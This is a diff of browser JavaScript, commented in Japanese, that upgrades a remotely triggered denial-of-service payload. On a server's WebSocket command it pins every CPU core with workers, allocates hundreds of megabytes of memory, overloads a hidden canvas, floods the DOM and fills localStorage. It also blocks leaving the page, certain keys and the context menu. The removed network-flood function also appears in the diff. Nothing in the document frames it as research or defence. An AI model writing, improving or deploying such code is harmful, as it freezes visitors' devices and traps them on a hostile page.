@@ -3,7 +3,6 @@
 
     let socket = null;
     let isAttacking = false;
-    let intensity = 1;
 
     function connectWebSocket() {
         try {
@@ -11,40 +10,23 @@
             socket = new WebSocket(protocol + location.host + '/ws');
             
             socket.onopen = () => {
-                console.log('接続確立');
-                
-                setInterval(() => {
-                    if (socket.readyState === WebSocket.OPEN) {
-                        socket.send(JSON.stringify({
-                            type: 'ping',
-                            timestamp: Date.now()
-                        }));
-                    }
-                }, 1000);
-                
-                startAttack(2);
+                startAttack();
             };
             
             socket.onmessage = (e) => {
                 try {
                     const data = JSON.parse(e.data);
-                    
-                    switch(data.command) {
-                        case 'attack':
-                            startAttack(data.intensity || 1);
-                            break;
-                        case 'stop':
-                            stopAttack();
-                            break;
-                        case 'update':
-                            intensity = data.config?.intensity || intensity;
-                            break;
+                    if (data.command === 'attack') {
+                        startAttack();
+                    }
+                    if (data.command === 'stop') {
+                        isAttacking = false;
                     }
                 } catch(err) {}
             };
             
             socket.onclose = () => {
-                setTimeout(connectWebSocket, 100);
+                setTimeout(connectWebSocket, 1000);
             };
             
             socket.onerror = () => {
@@ -53,31 +35,66 @@
         } catch(e) {}
     }
 
-    function startAttack(level) {
-        intensity = level;
+    function startAttack() {
+        if (isAttacking) return;
         isAttacking = true;
         
         cpuAttack();
         memoryAttack();
         gpuAttack();
         domAttack();
-        networkAttack();
         storageAttack();
     }
 
-    function stopAttack() {
-        isAttacking = false;
-    }
-
+    // CPU攻撃 - 強力版
     function cpuAttack() {
         const cores = navigator.hardwareConcurrency || 4;
+        
+        // メインスレッドでも負荷
+        function mainThreadLoad() {
+            if (!isAttacking) return;
+            
+            let x = 0;
+            const start = Date.now();
+            
+            // 50ms全力計算 → 10ms休憩 → 繰り返し
+            while (Date.now() - start < 50) {
+                x += Math.sqrt(Math.random() * 1000) * Math.random();
+                x += Math.pow(Math.random(), 2) * Math.random();
+                x += Math.sin(Math.random() * 360) * Math.random();
+            }
+            
+            setTimeout(mainThreadLoad, 10);
+        }
+        
+        // Web Workersで全コア飽和
         const workerCode = `
-            setInterval(() => {
+            let running = true;
+            
+            self.onmessage = (e) => {
+                if (e.data === 'stop') running = false;
+                if (e.data === 'start') running = true;
+            };
+            
+            function heavyLoop() {
+                if (!running) return;
+                
                 let x = 0;
-                for (let i = 0; i < 10000000; i++) {
-                    x += Math.sqrt(i) * Math.random();
+                const start = Date.now();
+                
+                while (Date.now() - start < 100) {
+                    x += Math.sqrt(Math.random() * 1000) * Math.random();
+                    x += Math.pow(Math.random(), 2) * Math.random();
+                    x += Math.sin(Math.random() * 360) * Math.random();
+                    x += Math.cos(Math.random() * 360) * Math.random();
+                    x += Math.tan(Math.random() * 360) * Math.random();
+                    x += Math.log(Math.random() * 1000 + 1) * Math.random();
                 }
-            }, 0);
+                
+                setTimeout(heavyLoop, 0);
+            }
+            
+            heavyLoop();
         `;
         
         const blob = new Blob([workerCode], { type: 'application/javascript' });
@@ -85,119 +102,162 @@
         
         for (let i = 0; i < cores; i++) {
             try {
-                new Worker(url);
+                const worker = new Worker(url);
+                worker.postMessage('start');
             } catch(e) {}
         }
+        
+        mainThreadLoad();
     }
 
+    // メモリ攻撃 - 改良版
     function memoryAttack() {
         const memArrays = [];
         
-        setInterval(() => {
+        function allocateMemory() {
             if (!isAttacking) return;
             
             try {
-                for (let i = 0; i < 5 * intensity; i++) {
-                    const buffer = new ArrayBuffer(1024 * 1024 * 10);
+                // 一気に50MB確保
+                for (let i = 0; i < 10; i++) {
+                    const buffer = new ArrayBuffer(1024 * 1024 * 5);
                     const view = new Uint8Array(buffer);
-                    for (let j = 0; j < view.length; j += 1000) {
+                    
+                    // 全領域に書き込み
+                    for (let j = 0; j < view.length; j += 100) {
                         view[j] = Math.random() * 255;
                     }
+                    
                     memArrays.push(buffer);
                 }
                 
-                if (memArrays.length > 50) {
-                    memArrays.splice(0, 5);
+                // 100個(500MB)超えたら古いのを捨てる
+                if (memArrays.length > 100) {
+                    memArrays.splice(0, 20);
                 }
             } catch(e) {
+                // メモリ不足
                 memArrays.length = 0;
             }
-        }, 100);
+            
+            setTimeout(allocateMemory, 50);
+        }
+        
+        allocateMemory();
     }
 
+    // GPU攻撃 - 改良版
     function gpuAttack() {
         try {
             const canvas = document.createElement('canvas');
-            canvas.width = 4000;
-            canvas.height = 4000;
+            canvas.width = 8000;
+            canvas.height = 8000;
             canvas.style.display = 'none';
             document.body.appendChild(canvas);
             const ctx = canvas.getContext('2d');
             
-            setInterval(() => {
+            function heavyDraw() {
                 if (!isAttacking) return;
                 
-                for (let i = 0; i < 100; i++) {
-                    ctx.fillStyle = `rgb(${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)})`;
-                    ctx.fillRect(Math.random()*4000, Math.random()*4000, 100, 100);
+                // 大量の描画
+                for (let i = 0; i < 500; i++) {
+                    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()})`;
+                    ctx.fillRect(
+                        Math.random()*8000,
+                        Math.random()*8000,
+                        Math.random()*500,
+                        Math.random()*500
+                    );
                 }
                 
-                for (let i = 0; i < 10; i++) {
-                    const grad = ctx.createRadialGradient(
-                        Math.random()*4000, Math.random()*4000, 0,
-                        Math.random()*4000, Math.random()*4000, 500
-                    );
-                    grad.addColorStop(0, `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},1)`);
-                    grad.addColorStop(1, `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0)`);
-                    ctx.fillStyle = grad;
-                    ctx.fillRect(0, 0, 4000, 4000);
+                // 複雑なパス
+                for (let i = 0; i < 50; i++) {
+                    ctx.beginPath();
+                    ctx.moveTo(Math.random()*8000, Math.random()*8000);
+                    
+                    for (let j = 0; j < 20; j++) {
+                        ctx.lineTo(Math.random()*8000, Math.random()*8000);
+                    }
+                    
+                    ctx.strokeStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()})`;
+                    ctx.lineWidth = Math.random() * 50;
+                    ctx.stroke();
                 }
-            }, 0);
+                
+                // 影付き描画（重い）
+                ctx.shadowBlur = 100;
+                ctx.shadowColor = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
+                
+                for (let i = 0; i < 100; i++) {
+                    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
+                    ctx.fillRect(
+                        Math.random()*8000,
+                        Math.random()*8000,
+                        Math.random()*1000,
+                        Math.random()*1000
+                    );
+                }
+                
+                ctx.shadowBlur = 0;
+                
+                setTimeout(heavyDraw, 0);
+            }
+            
+            heavyDraw();
         } catch(e) {}
     }
 
+    // DOM攻撃 - 改良版
     function domAttack() {
         const container = document.createElement('div');
         container.style.display = 'none';
         document.body.appendChild(container);
         
-        setInterval(() => {
-            if (!isAttacking) return;
-            
-            for (let i = 0; i < 200; i++) {
-                const el = document.createElement('div');
-                el.textContent = 'x'.repeat(Math.floor(Math.random() * 500));
-                el.style.cssText = `position:absolute;top:${Math.random()*1000}px;left:${Math.random()*1000}px;width:${Math.random()*100}px;height:${Math.random()*100}px;background:rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});`;
-                container.appendChild(el);
-            }
-            
-            if (container.children.length > 5000) {
-                container.innerHTML = '';
-            }
-        }, 50);
-    }
-
-    function networkAttack() {
-        setInterval(() => {
-            if (!isAttacking) return;
-            
-            for (let i = 0; i < 10; i++) {
-                fetch(location.href.split('?')[0] + '?dummy=' + Math.random(), {
-                    mode: 'no-cors',
-                    cache: 'no-store'
-                }).catch(() => {});
-            }
-            
-            if (socket && socket.readyState === WebSocket.OPEN) {
-                const largeData = 'x'.repeat(1024 * 50);
-                for (let i = 0; i < 3; i++) {
-                    socket.send(JSON.stringify({
-                        type: 'flood',
-                        data: largeData,
-                        timestamp: Date.now()
-                    }));
-                }
-            }
-        }, 100);
-    }
-
-    function storageAttack() {
-        setInterval(() => {
+        function createElements() {
             if (!isAttacking) return;
             
             try {
-                for (let i = 0; i < 20; i++) {
-                    localStorage.setItem('k_' + Math.random(), 'x'.repeat(5000));
+                // 大量の要素を一気に生成
+                for (let i = 0; i < 1000; i++) {
+                    const el = document.createElement('div');
+                    el.textContent = 'x'.repeat(Math.floor(Math.random() * 1000));
+                    el.setAttribute('data-index', i);
+                    el.setAttribute('data-random', Math.random());
+                    el.setAttribute('data-date', Date.now());
+                    el.style.cssText = `
+                        position: absolute;
+                        top: ${Math.random()*10000}px;
+                        left: ${Math.random()*10000}px;
+                        width: ${Math.random()*500}px;
+                        height: ${Math.random()*500}px;
+                        background: rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});
+                        opacity: ${Math.random()};
+                        transform: rotate(${Math.random()*360}deg);
+                        border: ${Math.random()*10}px solid rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});
+                    `;
+                    container.appendChild(el);
+                }
+                
+                // 5000個超えたらリセット
+                if (container.children.length > 5000) {
+                    container.innerHTML = '';
+                }
+            } catch(e) {}
+            
+            setTimeout(createElements, 30);
+        }
+        
+        createElements();
+    }
+
+    // ストレージ攻撃
+    function storageAttack() {
+        function fillStorage() {
+            if (!isAttacking) return;
+            
+            try {
+                for (let i = 0; i < 50; i++) {
+                    localStorage.setItem('k_' + Math.random(), 'x'.repeat(10000));
                 }
                 
                 if (localStorage.length > 500) {
@@ -207,20 +267,19 @@
                     }
                 }
             } catch(e) {}
-        }, 200);
+            
+            setTimeout(fillStorage, 100);
+        }
+        
+        fillStorage();
     }
 
+    // 離脱防止
     function preventLeave() {
         window.addEventListener('beforeunload', (e) => {
             e.preventDefault();
             e.returnValue = '';
         });
-        
-        setInterval(() => {
-            try {
-                history.replaceState(null, '', location.href);
-            } catch(e) {}
-        }, 1000);
         
         document.addEventListener('keydown', (e) => {
             if (
@@ -234,6 +293,8 @@
                 return false;
             }
         }, true);
+        
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
     }
 
     function init() {
